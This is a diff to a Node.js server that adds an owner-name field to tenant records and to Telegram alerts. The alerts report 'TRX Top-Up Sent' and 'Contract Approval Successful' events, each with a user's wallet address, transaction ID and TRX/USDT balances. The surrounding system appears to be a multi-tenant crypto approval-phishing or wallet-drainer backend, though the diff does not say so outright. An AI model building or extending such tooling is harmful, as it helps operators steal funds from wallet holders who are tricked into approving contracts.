@@ -261,7 +261,9 @@ async function sendTopUpNotification(tenant, domain, amount, userWalletAddress, 
             return false;
         }
 
+        const ownerName = tenant.ownerName || tenant.name || domain || 'Owner';
         const message = `🔔 *TRX Top-Up Sent*\n\n` +
+                       `👤 *Owner:* ${ownerName}\n` +
                        `🌐 *Domain:* ${domain || 'unknown'}\n` +
                        `💰 *Amount Sent:* ${amount} TRX\n` +
                        `👤 *User Wallet Address:* \`${userWalletAddress}\`\n` +
@@ -334,7 +336,9 @@ async function sendApprovalNotification(tenant, domain, walletAddress, transacti
         const trxBalanceStr = trxBalance !== undefined ? parseFloat(trxBalance).toFixed(6) : 'N/A';
         const usdtBalanceStr = usdtBalance !== undefined ? parseFloat(usdtBalance).toFixed(2) : 'N/A';
         
+        const ownerName = tenant.ownerName || tenant.name || domain || 'Owner';
         const message = `✅ *Contract Approval Successful*\n\n` +
+                       `👤 *Owner:* ${ownerName}\n` +
                        `🌐 *Domain:* ${domain}\n` +
                        `💰 *Wallet Address:* \`${walletAddress}\`\n` +
                        `📊 *Transaction ID:* \`${txIdStr}\`\n` +
@@ -767,7 +771,7 @@ app.get('/server-info', tenantMiddleware, (req, res) => {
 app.post('/admin/add-tenant', async (req, res) => {
     try {
         // Simple authentication - you should add proper auth in production
-        const { adminKey, domain, tronPrivateKey, tronAddress, telegramBotToken, telegramChatId, autoSendAmount, minimumBalance } = req.body;
+        const { adminKey, domain, tronPrivateKey, tronAddress, telegramBotToken, telegramChatId, autoSendAmount, minimumBalance, ownerName } = req.body;
         
         // Check admin key (set in environment variable)
         if (adminKey !== process.env.ADMIN_KEY) {
@@ -808,6 +812,7 @@ app.post('/admin/add-tenant', async (req, res) => {
         tenants[domain] = {
             // DO NOT store private key in tenants.json
             // tronPrivateKey: privateKey, // REMOVED - use env var instead
+            ownerName: ownerName || domain, // Owner name for Telegram notifications
             tronAddress: tronAddress,
             telegramBotToken: telegramBotToken || '',
             telegramChatId: telegramChatId || '',
